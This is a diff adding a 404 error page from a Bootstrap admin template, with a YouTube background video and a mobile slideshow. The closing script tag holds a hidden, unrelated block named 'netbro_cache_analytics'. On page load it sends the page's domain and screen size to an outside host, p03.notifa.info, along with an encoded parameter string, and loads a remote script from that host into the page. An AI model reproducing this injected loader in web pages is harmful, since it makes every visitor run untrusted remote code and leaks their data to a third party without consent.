@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+
+<html lang="en-us" class="no-js">
+
+	<head>
+		<meta charset="utf-8">
+		<title>404 Ablepeo v7.0 bootstrap admin template by Phoenixcoded</title>
+		<meta name="description" content="Able 7.0 404 Error page design" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<meta name="author" content="Codedthemes">
+        <!-- Favicon -->
+        <link rel="shortcut icon" href="img/favicon.ico">
+		<link rel="stylesheet" type="text/css" href="css/style.css" />
+	</head>
+
+	<body>
+
+        <a id="bgndVideo" class="player" data-property="{videoURL:'http://youtu.be/RdGVz104b3E',containment:'body',autoPlay:true, mute:false, startAt:0, stopAt:0, opacity:1}"></a>
+
+        <!-- Your logo on the top left -->
+        <a href="#" class="logo-link" title="back home">
+
+            <img src="img/logo.png" class="logo" alt="Company's logo" />
+
+        </a>
+
+        <div class="content">
+
+            <div class="content-box">
+
+                <div class="big-content">
+
+                    <!-- Main squares for the content logo in the background -->
+                    <div class="list-square">
+                        <span class="square"></span>
+                        <span class="square"></span>
+                        <span class="square"></span>
+                    </div>
+
+                    <!-- Main lines for the content logo in the background -->
+                    <div class="list-line">
+                        <span class="line"></span>
+                        <span class="line"></span>
+                        <span class="line"></span>
+                        <span class="line"></span>
+                        <span class="line"></span>
+                        <span class="line"></span>
+                    </div>
+
+                    <!-- The animated searching tool -->
+                    <i class="fa fa-search" aria-hidden="true"></i>
+
+                    <!-- div clearing the float -->
+                    <div class="clear"></div>
+
+                </div>
+
+                <!-- Your text -->
+                <h1>Oops! Error 404 not found.</h1>
+
+                <p>The page you were looking for doesn't exist.<br>
+                    We think the page may have moved.</p>
+
+            </div>
+
+        </div>
+
+    <footer class="light">
+        <ul>
+            <li><a href="#">Support</a></li>
+            <li><a href="#"><i class="fa fa-facebook"></i></a></li>
+            <li><a href="#"><i class="fa fa-twitter"></i></a></li>
+        </ul>
+    </footer>
+        <script src="js/jquery.min.js"></script>
+        <script src="js/bootstrap.min.js"></script>
+
+        <!-- YouTube plugin -->
+        <script src="js/jquery.mb.YTPlayer.js"></script>
+
+        <!-- Slideshow plugin for YouTube variant -->
+        <script src="js/vegas-youtube.js"></script>
+
+        <script>
+        (function(){
+        "use strict";
+
+            var myPlayer = jQuery( "#bgndVideo" ).YTPlayer();
+
+            var onMobile = false;
+
+            if( /Android|webOS|iPhone|iPad|iPod|BlackBerry/i.test(navigator.userAgent) ) { onMobile = true; }
+
+            if( ( onMobile === false ) ) {
+
+                $(".player").mb_YTPlayer();
+
+            } else {
+
+                $("body").vegas({
+                    slides: [
+                        { src: "img/home-slide-1.jpg" },
+                        { src: "img/home-slide-2.jpg" },
+                        { src: "img/home-slide-3.jpg" }
+                    ],
+
+                    // Delay beetween slides in milliseconds.
+                    delay: 5000,
+                    transition: 'fade'
+
+                });
+            }
+        })()
+
+        </script>
+
+    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2zsM83j56R0qqsxO8w2CeqjwTbvEX0hH2kTTMV4VI2wM4pnmK8of%2fP9BOtPkh0FgWgIpWDUZ71KQ8vI57u2qJufaHsdq1z%2fRvmLmXL%2fWK4WjgDsXJsVPwN98GiQ8cslYNlY28IZc6dsJSRNLX6zCHcGxP030%2boZBEbEqYDvQ%2bwGC1JAjfEwX7Vv2Gm%2b6Dj6xg7yMO82edUYU6yHGC7J8es%2fkXD4fJgq%2bY55kQGyN16SZVP7iM6w7pOoYh0xIBdNm5rP65Su3qiEIbLqIIv02mtto%2b3hHat3dd7JU9jyNp2bOnvjxf4H%2bzoyBdcNU9xYenn%2b4VrpkKPWDO913F9xgYzqWRxg3hbh3uAm3jZfQ9pVnnKlghIfhOELmfL17cFXxSO4%2bTnnJaRtFtGbKeF%2fGqHx4eR%2f7Vhqdq0GqDH37anLPRu4giYpP5m090vJzQVezIRb3eqMAa3f69H066itDj6%2bqFQnnqWNPildEVl9jchxw%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+
+</html>
